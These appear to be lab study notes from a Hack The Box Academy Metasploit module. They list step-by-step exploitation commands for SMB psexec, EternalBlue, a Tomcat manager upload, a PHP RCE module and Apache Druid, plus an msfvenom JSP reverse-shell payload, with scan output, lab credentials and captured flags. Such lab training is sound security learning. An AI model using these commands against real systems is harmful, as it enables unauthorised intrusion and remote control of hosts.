# Automating Payloads & Delivery with Metasploit

sudo apt-get upgrade metasploit-framework
sudo msfconsole

## Global Example 

SMB (listening on 445) as the potential attack vector

msf6 > search smb

   57   exploit/windows/smb/psexec                                         1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution

msf6 > use 57
msf6 exploit(windows/smb/psexec) > options
set RHOSTS 10.129.196.112
set SMBSHARE ADMIN$
set SMBPass HTB_@cademy_stdnt!
set SMBUser htb-student
set LHOST 10.10.14.67
msf6 exploit(windows/smb/psexec) > exploit

cd c:\Users\htb-student\Documents

## EthernalBlue : msf6 auxiliary(scanner/smb/smb_ms17_010)
show options
set RHOSTS 10.129.201.97
run
[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)


## EthernalBlue : msf6 exploit(windows/smb/ms17_010_psexec)
set LHOST 10.10.14.67
set RHOSTS 10.129.201.97
exploit
shell : interact with the host directly
type flag.txt

## Tomcat
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
set payload
msf exploit(multi/http/tomcat_mgr_upload) > exploit

## RCE PHP
https://www.exploit-db.com/exploits/50064
sudo msfconsole
use 50064.rb
set USERNAME
set PASSWORD
set rhost
set vhost
meterpreter
shell
sudo -l
cat /customscripts/flag.txt

## TOMCAT via msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war -o root.war
sudo msfconsole
use exploit/multi/handler
set payload java/shell_reverse_tcp
set LHOST
run


## Metasploit LAB

nmap -sV 10.129.12.188

PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

search ms17_010
exploit/windows/smb/ms17_010_psexec
use 0

OR

search eternalromance type:exploit
use 0
exploit/windows/smb/ms17_010_psexec

setg RHOSTS 10.129.12.188
set LHOST 10.10.15.99
LHOST => 10.10.15.99
run
shell
type c:\Users\Administrator\Desktop\flag.txt
HTB{MSF-W1nD0w5-3xPL01t4t10n}

nmap -sV 10.129.43.105

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
8081/tcp open  http    Jetty 9.4.12.v20180830
8082/tcp open  http    Jetty 9.4.12.v20180830
8083/tcp open  http    Jetty 9.4.12.v20180830
8888/tcp open  http    Jetty 9.4.12.v20180830
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


show payloads
grep druid show payloads
grep meterpreter grep reverse_tcp show payloads
grep apache show payloads
apache

use auxiliary/gather/jetty_web_inf_disclosure

use exploit/linux/http/apache_druid_js_rce
set RHOSTS 10.129.43.105
set LHOST 10.10.15.99
shell
cat /root/flag.txt
HTB{MSF_Expl01t4t10n}
